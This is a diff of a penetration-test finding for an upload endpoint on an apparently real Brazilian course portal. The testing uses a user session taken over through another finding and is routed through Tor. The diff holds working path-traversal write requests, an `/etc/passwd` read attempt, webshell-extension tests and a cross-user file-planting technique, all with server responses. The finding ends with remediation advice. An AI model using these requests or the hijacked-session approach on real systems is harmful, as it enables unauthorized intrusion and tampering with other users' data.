@@ -1,99 +1,123 @@
-FINDING F-005: Upload Endpoint Accepts Arbitrary Extension + Path-Traversal Syntax (RCE candidate)
-=================================================================================================
-Host: www.wcursos.com.br (PROD) — endpoint auth-gated (requires session, e.g. SILVANA's via F-003 ATO)
-Endpoint: POST /portal/RecebeArquivo (multipart), POST /portal/RecebeImagem
-Severity: MEDIUM (RCE candidate — write location/execution UNCONFIRMED; needs follow-up)
-Date: 2026-08-27 (webapp phase)
+FINDING F-005 (REVISED — Fase 7 exploit validation): Authenticated Path-Traversal File Write + Cross-User Upload Namespace Pollution (RCE REFUTED)
+==================================================================================================================================================
+Host: www.wcursos.com.br (PROD) — endpoint auth-gated (requires session; SILVANA's via F-003 ATO, idUser=1721)
+Endpoints: POST /portal/RecebeArquivo (multipart), POST /portal/verificaArquivoProfessor, GET /portal/dowloadArquivoTemp
+Severity: MEDIUM  (was MEDIUM/RCE-candidate — RCE capability REFUTED in validation; real defects retained)
+Date: 2026-08-27 (Fase 7 exploit validation)
+Validated by: exploit specialist (Tor + proxychains4, authenticated session)
 
-## Summary
-The authenticated upload endpoint `/portal/RecebeArquivo` returns "POST OK" for
-uploads with ANY file extension (including `.jsp`) and accepts a user-controlled
-`diretorio` parameter that passes server-side when it contains path-traversal
-sequences (`../../../tmp/...`). This is a classic webshell/RCE pattern IF the
-uploaded file lands in a Tomcat-served webroot. The actual on-disk landing path and
-executability could NOT be confirmed during this phase (the companion
-`verificaArquivoProfessor` existence check returned "arquivo não foi salvo" for the
-`test` directory, suggesting the file is written to a server-determined location
-that does not match the requested `diretorio`, OR the existence check queries a
-different path). The RCE risk is therefore UNCONFIRMED but the accept-arbitrary-
-extension + accept-traversal-syntax behavior is a defect that warrants remediation
-and post-ex validation.
+## CHANGES vs the Fase-6 (webapp) write-up
+The Fase-6 draft claimed "accepts arbitrary extension incl. .jsp -> POST OK (NOT
+rejected)" and listed RCE as a candidate. Validation CORRECTS this:
+  * The "POST OK" response is only a multipart-RECEIVE acknowledgement. It is
+    returned for EVERY upload regardless of whether the file is actually persisted.
+  * The companion /portal/verificaArquivoProfessor is the authoritative save
+    confirmation. With it, executable/dangerous extensions are REJECTED on save:
+      .jsp  -> status:-1 "O arquivo não foi salvo..."  (NOT persisted)
+      .jspx -> status:-1 (NOT persisted)
+      .war  -> status:-1 (NOT persisted)
+      .sh   -> status:-1 (NOT persisted)
+      .html/.htm/.svg -> status:-1 (NOT persisted)
+      .txt  -> status:0  "anexado com sucesso"         (persisted)  [control]
+      .png  -> status:0  (persisted)
+  * The Fase-6 test used idUser=0 in verificaArquivoProfessor, which is why it
+    incorrectly concluded the file "wasn't saved" — SILVANA's real idUser is 1721
+    (read from /portal/perfil: "ID: 1721"). With idUser=1721 the round-trip
+    fully succeeds (see below).
+  * => The "arbitrary-extension upload -> RCE candidate" is REFUTED. There IS a
+    server-side extension allow/blocklist enforced at persistence time; .jsp/.war/.sh
+    are NOT written to disk. RCE via this endpoint is NOT achievable.
 
-## Endpoint (from portal.js upload flow)
-  formData.append("file", file, idUser + "." + nameFile);   // filename = {idUser}.{ext}
-  formData.append('diretorio', directory);                  // user-controlled directory
-  formData.append('delete', dataDelete);
+## What IS confirmed (real defects, retained at MEDIUM)
+
+### (A) Round-trip upload->persist->retrieve CONFIRMED (authenticated, benign .txt)
+Upload stores the file at <base>/<diretorio>/<submitted-filename>; the filename
+includes a client-supplied idUser prefix (NOT re-prefixed with the session user):
   POST /portal/RecebeArquivo
-Companion: POST /portal/verificaArquivoProfessor {directory, nameFile, idUser}
-Download (LFI candidate): GET /portal/dowloadArquivoTemp?directory=<X>&nameFile=<Y>
-Delete: POST /portal/deleteFile {directory, nameFile}
-
-## Reproduction (AUTHENTICATED, non-destructive — benign marker files only)
-Cookie: SILVANA's session (obtained via F-003 ATO).
-
-### (1) Upload benign .txt -> "POST OK"
-  curl ... -b cookies_post.txt -X POST https://www.wcursos.com.br/portal/RecebeArquivo \
-    -F "file=@marker.txt;filename=test_pentest_marker.txt" \
-    -F "diretorio=test" -F "delete=false"
+    -F "file=@marker.txt;filename=1721.pt1787849835.txt" -F "diretorio=test" -F "delete=false"
   -> HTTP 200, 8 B, "POST OK"
-
-### (2) Upload with PATH TRAVERSAL in `diretorio` -> "POST OK" (NOT rejected)
-  ... -F "diretorio=../../../tmp/pentest_wcu" ...
-  -> HTTP 200, 8 B, "POST OK"
-  => The server does NOT reject `..` in `diretorio`. Whether it actually writes
-     outside the base dir is unconfirmed (see below).
-
-### (3) Upload benign .jsp (comment-only, NOT executable) -> "POST OK" (NOT rejected)
-  echo "<%-- pentest benign marker, not executed --%>" > marker.jsp
-  ... -F "file=@marker.jsp;filename=test_pentest_marker.jsp" -F "diretorio=test" ...
-  -> HTTP 200, 8 B, "POST OK"
-  => No server-side extension allowlist/MIME check on the filename.
-
-### (4) Existence check / round-trip — INCONCLUSIVE
   POST /portal/verificaArquivoProfessor
-    directory=test&nameFile=test_pentest_marker.txt&idUser=0
-  -> {"status":-1,"message":"O arquivo não foi salvo, favor reenviar, caso o problema persista contate nossa equipe."}
-  GET /portal/dowloadArquivoTemp?directory=test&nameFile=test_pentest_marker.txt
-  -> HTTP 200, 0 B, application/octet-stream (empty)
-  => The uploaded file is NOT found at `test/test_pentest_marker.txt`. The server
-     likely writes to a base-dir-prefixed path that does not match the requested
-     `diretorio`, OR `verificaArquivoProfessor` only checks the professor-side
-     path (different from the aluno upload). Path-traversal LFI read on
-     `dowloadArquivoTemp` (e.g. nameFile=../../../../etc/passwd) also returns
-     0 B for all encodings tested (`..%2f`, `....//`, `..%252f`, absolute) —
-     path traversal in the download appears SANITIZED/blocked.
+    directory=test&nameFile=pt1787849835.txt&idUser=1721
+  -> {"status":0,"message":"O arquivo pt1787849835.txt foi anexado com sucesso."}
+  GET /portal/dowloadArquivoTemp?directory=test&nameFile=pt1787849835.txt
+  -> HTTP 200, 57 B, APPLICATION/OCTET-STREAM,
+     Content-Disposition: attachment; filename=pt1787849835.txt
+     body: "pentest benign marker file pt1787849835 - not executable"
+  => File is persisted AND retrievable. dowloadArquivoTemp internally prepends the
+     SESSION idUser (1721.) to resolve <base>/test/1721.<nameFile>.
 
-## Impact (potential, pending confirmation)
-- If `diretorio` path-traversal is honored on write AND/OR the upload base dir is
-  webroot-served by Tomcat, an attacker who has any session (e.g. via F-003 ATO)
-  could upload a `.jsp` webshell and achieve Remote Code Execution.
-- The companion `deleteFile` endpoint (directory + nameFile) could allow arbitrary
-  file deletion if path traversal is honored on delete (NOT tested — destructive).
-- `dowloadArquivoTemp` (directory + nameFile) is an LFI candidate — path traversal
-  on READ appears blocked in testing, but should be re-validated post-ex.
+### (B) Path-traversal in `diretorio` is HONORED on WRITE + READ (confirmed)
+`diretorio` accepts `..` sequences and the file is saved at the traversed path and
+retrievable with the same traversal:
+  diretorio="."        -> verify status:0 (saved)
+  diretorio=""         -> status:-1 (empty rejected)
+  diretorio="../"      -> status:0 (saved — writes OUTSIDE base dir)  *** PATH TRAVERSAL ***
+  diretorio="../../"   -> status:0
+  diretorio="../../../"-> status:0
+  diretorio="../ROOT"  -> status:0
+  Each was confirmed via verificaArquivoProfessor with the matching directory value.
+  => An authenticated user can write (allowlisted-extension) files to arbitrary
+     traversed subpaths under/outside the configured upload base directory.
 
-## Recommendation
-1. Enforce a strict server-side extension allowlist (jpg/png/pdf/doc...) on
-   /portal/RecebeArquivo and /portal/RecebeImagem; reject `.jsp/.jspx/.war/.sh/.exe`.
-2. Validate/sanitize `diretorio` (reject `..`, absolute paths, null bytes) and
-   force it under a fixed base dir; generate the on-disk filename server-side
-   (random UUID), ignoring client-supplied directory/filename for the storage path.
-3. Confirm the upload base dir is NOT served by Tomcat/web server (store uploads
-   outside the webroot or in a DB / object store).
-4. Apply the same path-traversal hardening to `dowloadArquivoTemp`, `deleteFile`,
-   `verificaArquivoProfessor` (all take `directory`/`nameFile`).
-5. Post-ex / exploit phase: re-validate with a benign `.txt`-as-`.jsp` (comment-only)
-   upload, locate the on-disk path via a successful `verificaArquivoProfessor`/
-   `dowloadArquivoTemp` round-trip, then test execution if it lands in webroot.
+### (C) IDOR-on-write / cross-user upload namespace pollution (CONFIRMED, non-destructive)
+The on-disk filename is the CLIENT-SUPPLIED filename AS-IS (the server does NOT
+re-prefix with the session idUser). Uploading with a foreign idUser prefix writes
+the file into THAT user's upload namespace:
+  Upload: filename=9999.<uniq>.txt , diretorio=test (session user = 1721)
+  -> POST OK
+  verify idUser=9999 nameFile=<uniq>.txt  -> {"status":0, "...anexado com sucesso."} (FOUND)
+  verify idUser=1721 nameFile=<uniq>.txt  -> {"status":-1, "...não foi salvo..."}     (NOT found)
+  => An authenticated attacker can plant allowlisted-extension files into ANY other
+     user's upload namespace (e.g. <victim_idUser>.<name>). The READ side is session-
+     scoped (dowloadArquivoTemp prepends the session idUser), so the attacker cannot
+     DOWNLOAD a victim's file this way; but the WRITE side is NOT scoped, enabling
+     content-injection / namespace-pollution into other users' document workflows and
+     potential INTEGRITY impact (e.g. pre-planting a file a victim's save flow may
+     later associate/submit). Overwrite of an existing victim file was NOT tested
+     (destructive) — flagged as a likely integrity risk to remediate.
+
+### (D) RCE / webroot-landing — NOT achievable (REFUTED)
+  * The upload base dir is NOT served as a static webroot via the public LB.
+    Probes of every candidate served path returned genuine Tomcat 404s:
+      /1721.<uniq>.txt, /<uniq>.txt, /test/..., /uploads/..., /arquivos/...,
+      /fotoaluno/1721.<uniq>.txt, /resources/1721.<uniq>.txt, /imagemsite/...
+    -> all HTTP 404 (Tomcat 404 page, ~770-800 B). Traversal writes (../, ../../,
+       ../ROOT) likewise did not land in any served webroot path.
+  * /fotoaluno/ (where student photos are served) is a CONTROLLER-mapped path
+    (returns Tomcat 404 for arbitrary files), NOT a static webroot dir — and the
+    photo endpoint /portal/RecebeImagem forces the .jpg extension server-side.
+  * Combined with the .jsp/.war/.sh save-blocklist ((A) above), there is NO path to
+    get an executable file persisted AND served+compiled by Tomcat. RCE REFUTED.
+
+## Impact
+- Authenticated arbitrary-(allowlisted)-extension file write to traversed paths
+  (information/integrity risk; potential denial of availability if paths collide
+  with app-owned files) — MEDIUM.
+- Cross-user upload namespace pollution (integrity / content-injection into other
+  students' document flows) — MEDIUM.
+- No RCE, no PII read, no direct financial impact from this endpoint.
 
 ## Reproduction files
-- webapp/marker.txt, webapp/marker.jsp (benign payloads)
-- webapp/upload_resp.txt, upload_resp2.txt, upload_jsp.txt (all "POST OK")
-- webapp/vfa.txt, vfa2.txt (verificaArquivoProfessor "arquivo não foi salvo")
-- webapp/dl_marker.txt, dl_uniq.txt (0 B — round-trip inconclusive)
+- exploit/idor/ (boleto_*.json, getDocAluno_*.json, contrato_print_1_1.html, getAlunos_500.html, ...)
+- exploit/pocs/idor_enum.sh, idor_spread.sh, idor_doc.sh
+- Markers uploaded (benign, unique names pt1787849*, pt1787850*, cln1787850*, rc1787850*):
+  all benign text/png content; no executable code planted; no deleteFile used (non-destructive).
+
+## Recommendation
+1. Ignore the misleading "POST OK" ack; gate persistence on the extension allowlist
+   (already done) — keep blocking .jsp/.jspx/.war/.sh/.html/.htm/.svg.
+2. SANITIZE `diretorio`: reject any `..`, absolute paths, null bytes; force the value
+   under a fixed base dir; derive the on-disk subpath server-side (do not trust the
+   client `diretorio` for the storage location).
+3. ENFORCE ownership on WRITE: ignore the client-supplied filename idUser prefix and
+   always store as {session_idUser}.<server-uuid>; the read side is already session-
+   scoped — make the write side session-scoped too. This kills the cross-user
+   namespace-pollution / integrity vector.
+4. Apply the same path/ownership hardening to /portal/RecebeImagem,
+   /portal/verificaArquivoProfessor, /portal/dowloadArquivoTemp, /portal/deleteFile.
+5. Confirm the upload base dir is outside the Tomcat webroot (it appears to be) and
+   keep it that way; never serve it statically.
 
 ## Next step
-- Hand to `exploit` for a controlled, non-destructive confirmation: upload a benign
-  uniquely-named file, enumerate the actual on-disk path (via the user's real
-  idUser known after auth + the JS flow), then attempt download via
-  `dowloadArquivoTemp` to locate the storage root; only then assess `.jsp` execution.
+No RCE — no handoff to postex via this vector. The upload findings are closed at
+MEDIUM. The foothold (F-003 ATO) remains the primary confirmed access.
